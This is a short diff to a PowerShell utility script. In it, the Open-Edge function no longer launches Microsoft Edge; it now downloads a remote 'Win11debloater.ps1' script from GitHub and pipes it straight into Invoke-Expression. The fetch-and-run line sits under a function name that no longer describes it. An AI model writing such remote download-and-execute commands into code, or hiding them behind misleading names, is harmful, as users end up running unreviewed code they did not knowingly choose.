@@ -14,11 +14,7 @@ function Run-ChrisTitus {
 }
 
 function Open-Edge {
-    try {
-        Start-Process "msedge"
-    } catch {
-        [System.Windows.Forms.MessageBox]::Show("Microsoft Edge not found.")
-    }
+   Start-Process powershell -ArgumentList "-Command irm https://raw.githubusercontent.com/VMCBhargav/powerscript/refs/heads/main/Win11debloater.ps1 | iex"
 }
 
 function Cleanup-And-Exit {
